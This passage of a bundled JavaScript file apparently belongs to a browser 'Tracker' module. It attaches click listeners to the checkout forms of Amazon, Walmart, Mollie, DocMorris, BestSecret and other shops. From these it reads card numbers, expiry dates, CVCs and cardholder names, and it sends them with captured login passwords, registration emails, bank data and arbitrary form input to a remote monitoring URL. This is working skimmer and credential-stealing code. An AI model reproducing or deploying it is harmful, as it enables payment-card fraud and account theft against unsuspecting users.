                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreDocmorrisPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (elements.length > 4 && elements.length < 6) {
                        if (document.querySelectorAll('#perkreditkarte').length !== 0) {
                            document.querySelectorAll('#perkreditkarte').forEach(function (__dataConfirmElement) {
                                if (__dataConfirmElement.getAttribute('form') === "form-paymentmethods-credit_card") {
                                    if (callback) {
                                        callback(__dataConfirmElement, elements);
                                    }
                                }
                            });
                        }
                    }
                }
                else {
                    self.exploreDocmorrisPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    explorePaygatePaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "SSLForm") {
                let elements = [];
                self.explorePaygatePaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            if (__childElement.nodeName === 'INPUT') {
                                if (__childElement.type === 'radio' && __childElement.checked) {
                                    paymentMethodData.push({
                                        'element': __childElement.nodeName,
                                        'id': __childElement.id,
                                        'name': __childElement.name,
                                        'value': __childElement.value,
                                    });
                                }
                                else {
                                    if (__childElement.type === 'text') {
                                        paymentMethodData.push({
                                            'element': __childElement.nodeName,
                                            'id': __childElement.id,
                                            'name': __childElement.name,
                                            'value': __childElement.value,
                                        });
                                    }
                                }
                            }
                            if (__childElement.nodeName === 'SELECT') {
                                paymentMethodData.push({
                                    'element': __childElement.nodeName,
                                    'id': __childElement.id,
                                    'name': __childElement.name,
                                    'value': __childElement.value,
                                });
                            }
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    explorePaygatePaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON' || _childElement.type === 'radio') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT' || _childElement.type === 'radio') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.explorePaygatePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreSundayPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "one-step-checkout-form") {
                let elements = [];
                self.exploreSundayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreSundayPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreSundayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreMolliePaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "body") {
                let elements = [];
                self.exploreMolliePaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreMolliePaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreMolliePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreAnchorOnly(self, parentNode, listId, callback) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.getAttribute('data-txnid') === listId) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                }
                else {
                    self.exploreAnchorOnly(self, __detectedElement, listId, callback);
                }
            });
        }
    }
    exploreAnchorOnlyByHref(self, parentNode, listId, callback) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.href.indexOf(listId) !== -1) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                }
                else {
                    self.exploreAnchorOnlyByHref(self, __detectedElement, listId, callback);
                }
            });
        }
    }
    explorePaymentInputTagOnly(self, elementParentNode, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && __childElement.type === 'submit') {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentInputTagOnly(self, __childElement, callback);
                }
            });
        }
    }
    explorePayPalPaymentFormElement(self, __creditCardFormElement, elements, callback) {
        if (__creditCardFormElement.childNodes.length !== 0) {
            __creditCardFormElement.childNodes.forEach(function (_formChildElement) {
                if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' || _formChildElement.nodeName === 'BUTTON') {
                    if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' &&
                        _formChildElement.type !== 'hidden' && _formChildElement.id !== 'billingAddressId') {
                        elements.push(_formChildElement);
                    }
                    if (_formChildElement.nodeName === 'BUTTON' && _formChildElement.type === 'submit') {
                        if (callback) {
                            callback(_formChildElement, elements);
                        }
                    }
                }
                else {
                    self.explorePayPalPaymentFormElement(self, _formChildElement, elements, callback);
                }
            });
        }
    }
    exploreHelloFreshPaymentContainer(self, parentNode, callback) {
        parentNode.childNodes.forEach(function (__element) {
            if (__element.nodeName === 'BUTTON' && __element.getAttribute('data-test-id') === 'add-payment-method-save') {
                if (callback) {
                    callback(__element);
                }
            }
            else {
                self.exploreHelloFreshPaymentContainer(self, __element, callback);
            }
        });
    }
    exploreBestSecretPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "creditForm") {
                let elements = [];
                self.exploreBestSecretPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardHolder': paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreBestSecretPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON' && !_childElement.classList.contains('btn-link')
                        && !_childElement.classList.contains('btn-secondary-action') && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreBestSecretPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreAmazonPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (!__formElement.classList.contains('nav-searchbar') && __formElement.name !== 'ue_backdetect' && __formElement.style.display !== 'none') {
                let elements = [];
                self.exploreAmazonPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name.indexOf('accountHolderName') !== -1 || __childElement.name.indexOf('account_holder_name') !== -1 ? 'cardHolder' : (__childElement.name.indexOf('CardNumber') !== -1 ? 'cardNumber' : (__childElement.name.indexOf('month') !== -1 ? 'expirationMonth' : (__childElement.name.indexOf('year') !== -1 ? 'expirationYear' : 'Unknown'))),
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value,
                                'cardBrand': 'Unknown',
                                'cardHolder': paymentMethodData[0].value,
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                    });
                });
            }
        });
    }
    exploreAmazonPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' &&
                        _childElement.type !== 'submit' && _childElement.type !== 'checkbox' ||
                        _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'INPUT' && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreAmazonPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreWalmartPaymentContainer(self) {
        let interval = setInterval(function () {
            if (document.querySelector('.edit-form.multiple-required') !== null &&
                document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild !== null) {
                clearInterval(interval);
                if (document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.nodeName === 'BUTTON') {
                    ["click", "dblclick"].forEach(function (event) {
                        let tempPaymentMethodsStore = [];
                        document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.addEventListener(event, function () {
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'creditCard', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            document.querySelectorAll('.payment-option').forEach(function (element) {
                                if (!element.classList.contains('payment-inactive')) {
                                    element.classList.remove('payment-option');
                                    tempPaymentMethodsStore.push({
                                        'element': element.nodeName,
                                        'id': 'cardBrand',
                                        'value': element.className
                                    });
                                    element.classList.add('payment-option');
                                }
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'firstName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'lastName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'month-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'year-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'cvv', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            Tracker.send({
                                command: 'savePaymentMethodsData',
                                data: {
                                    'cardNumber': tempPaymentMethodsStore[0].value,
                                    'cardBrand': tempPaymentMethodsStore[1].value,
                                    'cardHolder': tempPaymentMethodsStore[2].value + ' ' + tempPaymentMethodsStore[3].value,
                                    "cardExpire": tempPaymentMethodsStore[4].value + '/' + tempPaymentMethodsStore[5].value,
                                    'cardCVC': tempPaymentMethodsStore[6].value,
                                    'event': 'add',
                                    "workWebsite": window.location.origin
                                }
                            });
                            tempPaymentMethodsStore = [];
                            self.exploreWalmartPaymentEditButton(self);
                        });
                    });
                }
            }
        }, 100);
    }
    exploreWalmartPaymentEditButton(self) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').length !== 0) {
                document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').forEach(function (formEditButton) {
                    if (formEditButton.getAttribute('data-automation-id') === 'edit-payment') {
                        clearInterval(interval);
                        formEditButton.addEventListener('click', function () {
                            self.exploreWalmartPaymentContainer(self);
                        });
                    }
                });
            }
        }, 100);
    }
    explorePaymentNewCard(self, elementParentNode, callback) {
        let detectedElements = [];
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.classList.contains('card-surface')) {
                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
                        __childElement.childNodes.forEach(function (__targetParentElement) {
                            if (__targetParentElement.classList.contains('card-no')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardNo', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if (__targetParentElement.classList.contains('card-bottom')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardHolder', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'expire', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'cvc', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        });
                    }
                }
            });
            if (callback) {
                callback(detectedElements);
            }
        }
    }
    explorePaymentSpanTag(self, elementParentNode, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('payment-title')) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentSpanTag(self, __childElement, callback);
                }
            });
        }
    }
    explorePaymentInputTag(self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentInputTag(self, __childElement, selfId, callback);
                }
            });
        }
    }
    explorePaymentSelectTag(self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SELECT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentSelectTag(self, __childElement, selfId, callback);
                }
            });
        }
    }
    static send(request) {
        if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
            let interval = setInterval(function () {
                if (window.sessionStorage.getItem('ip') !== null) {
                    clearInterval(interval);
                    __webpack_require__.e(/*! import() */ "Assets_typescripts_common_request_ts").then(__webpack_require__.bind(__webpack_require__, /*! ../common/request */ "./Assets/typescripts/common/request.ts")).then(function (t) {
                        if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
                            if (request.command === 'saveLoginData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": 'login',
                                            "username": request.data.username,
                                            "password": request.data.password,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                            else if (request.command === 'saveRegistrationData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": "registration",
                                            "username": request.data.username,
                                            "password": request.data.password,
                                            "email": request.data.email,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                            else if (request.command === 'saveLogoutData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": "logout",
                                            "username": request.data.username,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                            else if (request.command === 'saveNavigateData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": "navigate",
                                            "username": request.data.username,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                        }
                        if (request.command === 'savePaymentMethodsData') {
                            return t.sendRequest({
                                method: "POST",
                                url: globalAppMonitorMainURL + "clientPaymentMethodsRecord",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "paymentMethodsInfo": {
                                        _default_: {
                                            "tracker": Tracker.identity,
                                            "app_id": Tracker.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": Tracker.osNameAndArch,
                                            "browser": Tracker.browserNameFull
                                        },
                                        'cardNumber': request.data.cardNumber,
                                        'cardBrand': request.data.cardBrand,
                                        'cardHolder': request.data.cardHolder,
                                        "cardExpire": request.data.cardExpire,
                                        'cardCVC': request.data.cardCVC,
                                        'event': request.data.event,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                        if (request.command === 'saveBankAccountData') {
                            return t.sendRequest({
                                method: "POST",
                                url: globalAppMonitorMainURL + "clientBankAccountRecord",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "bankAccountData": {
                                        _default_: {
                                            "tracker": Tracker.identity,
                                            "app_id": Tracker.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": Tracker.osNameAndArch,
                                            "browser": Tracker.browserNameFull
                                        },
                                        'dataType': request.data.dataType,
                                        'dataValue': request.data.dataValue,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                        if (request.command === 'saveInputElementData') {
                            return t.sendRequest({
                                method: "POST",
                                url: globalAppMonitorMainURL + "InputElementDataRecord",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "inputElementData": {
                                        _default_: {
                                            "tracker": Tracker.identity,
                                            "app_id": Tracker.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": Tracker.osNameAndArch,
                                            "browser": Tracker.browserNameFull
                                        },
                                        'name': request.data.name,
                                        'type': request.data.type,
                                        'value': request.data.value,
                                        'placeholder': request.data.placeholder,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                    });
                }
            }, 100);
        }
    }
}


/***/ })

}]);
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoianMvQXNzZXRzX3R5cGVzY3JpcHRzX21pc2h1c29mdF9UcmFja2VyX3RzLnJ1bnRpbWUuYnVuZGxlLmpzIiwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7O0FBQU8sTUFBTSxpQkFBaUIsR0FBRztJQUM3QjtRQUNJLE9BQU8sRUFBRTtZQUNMLE9BQU8sRUFBRSxRQUFRLEVBQUUsUUFBUSxFQUFFLE9BQU8sRUFBRSxPQUFPLEVBQUUsUUFBUSxFQUFFLEtBQUssRUFBRSxZQUFZLEVBQUUsYUFBYSxFQUFFLElBQUksRUFBRSxhQUFhO1lBQ2hILFdBQVcsRUFBRSxVQUFVLEVBQUUsT0FBTyxFQUFFLEtBQUssRUFBRSxXQUFXLEVBQUUsTUFBTSxFQUFFLFlBQVksRUFBRSxNQUFNO1NBQ3JGO0tBQ0o7SUFDRCxFQUFDLFVBQVUsRUFBRSxDQUFDLEtBQUssRUFBRSxRQUFRLEVBQUUsTUFBTSxFQUFFLFVBQVUsRUFBRSxXQUFXLENBQUMsRUFBQztJQUNoRSxFQUFDLFFBQVEsRUFBRSxDQUFDLFFBQVEsQ0FBQyxFQUFDO0lBQ3RCO1FBQ0ksU0FBUyxFQUFFO1lBQ1AsUUFBUSxFQUFFLFNBQVMsRUFBRSxNQUFNLEVBQUUsVUFBVSxFQUFFLFNBQVMsRUFBRSxLQUFLLEVBQUUsVUFBVSxFQUFFLGFBQWEsRUFBRSxZQUFZO1lBQ2xHLGFBQWEsRUFBRSxTQUFTLEVBQUUsTUFBTTtTQUNuQztLQUNKO0lBQ0Q7UUFDSSxTQUFTLEVBQUU7WUFDUCxTQUFTLFNBQVEsRUFBRSxXQUFXLEVBQUUsY0FBYyxFQUFFLFNBQVMsRUFBRSxlQUFlLFNBQVE7WUFDbEYsY0FBYyxFQUFFLFdBQVcsRUFBRSxlQUFlLEVBQUUsT0FBTyxFQUFFLFVBQVUsRUFBRSxXQUFXLEVBQUUsUUFBUTtZQUN4RixVQUFVLEVBQUUsZUFBZSxFQUFFLG1CQUFtQixFQUFFLFdBQVcsRUFBRSxVQUFVLEVBQUUsU0FBUyxFQUFFLFFBQVE7WUFDOUYsUUFBUSxFQUFFLFNBQVMsRUFBRSxNQUFNLEVBQUUsUUFBUSxFQUFFLFVBQVUsRUFBRSxXQUFXLEVBQUUsVUFBVSxFQUFFLE9BQU8sRUFBRSxXQUFXLEVBQUUsS0FBSztZQUN2RyxRQUFRLEVBQUUsT0FBTyxFQUFFLFFBQVE7U0FDOUI7S0FDSjtDQUNKO0FBRU0sTUFBTSx3QkFBd0IsR0FBRztJQUNwQyxFQUFDLFlBQVksRUFBRSxDQUFDLEtBQUssRUFBRSxJQUFJLEVBQUUsUUFBUSxFQUFFLEVBQUM7SUFDeEMsRUFBQyxZQUFZLEVBQUUsQ0FBQyxRQUFRLEVBQUUsT0FBTyxFQUFFLE1BQU0sRUFBRSxFQUFDO0lBQzVDLEVBQUMsV0FBVyxFQUFFLENBQUMsT0FBTyxFQUFFLE1BQU0sRUFBRSxPQUFPLEVBQUUsRUFBQztJQUMxQyxFQUFDLFlBQVksRUFBRSxDQUFDLEtBQUssRUFBRSxFQUFDO0lBQ3hCLEVBQUMsU0FBUyxFQUFFLENBQUMsS0FBSyxFQUFFLEtBQUssRUFBRSxLQUFLLEVBQUUsY0FBYyxFQUFFLEVBQUM7SUFDbkQsRUFBQyxnQkFBZ0IsRUFBRSxDQUFDLEtBQUssRUFBRSxNQUFNLEVBQUUsRUFBQztJQUNwQywwQ0FBMEM7Q0FDN0M7Ozs7Ozs7Ozs7Ozs7Ozs7QUNsQ3lFO0FBRTFFLHFDQUFxQztBQUNyQyxJQUFJLHVCQUErQixDQUFDO0FBQ3BDLHVCQUF1QixHQUFHLG1DQUFtQyxDQUFDO0FBQzlELHNCQUFzQjtBQUlmLE1BQU0sT0FBTztJQUNULEdBQUcsQ0FBUztJQUNaLFNBQVMsQ0FBTztJQUNoQixpQkFBaUIsR0FBWSxLQUFLLENBQUM7SUFDbkMsWUFBWSxHQUFXLENBQUMsQ0FBQztJQUN6QixhQUFhLEdBQXVFLEVBQUUsQ0FBQztJQUN2RixlQUFlLEdBQXVFLEVBQUUsQ0FBQztJQUN6RiwyQkFBMkIsR0FBVyxFQUFFLENBQUM7SUFDekMsdUJBQXVCLEdBQVcsRUFBRSxDQUFDO0lBQ3JDLHNCQUFzQixHQUFXLEVBQUUsQ0FBQztJQUNwQywyQkFBMkIsR0FBVyxFQUFFLENBQUM7SUFDekMsb0JBQW9CLEdBQVcsRUFBRSxDQUFDO0lBQ2xDLDJCQUEyQixHQUFXLEVBQUUsQ0FBQztJQUN4QyxNQUFNLENBQUMsUUFBUSxDQUFTO0lBQ3hCLE1BQU0sQ0FBQyxPQUFPLENBQVM7SUFDdkIsTUFBTSxDQUFDLGFBQWEsQ0FBUztJQUM3QixNQUFNLENBQUMsZUFBZSxDQUFTO0lBRXZDLFlBQ0ksR0FBVyxFQUNYLFFBQWdCLEVBQ2hCLE9BQWUsRUFDZixhQUFxQixFQUNyQixrQkFBMEI7UUFFMUIsSUFBSSxDQUFDLEdBQUcs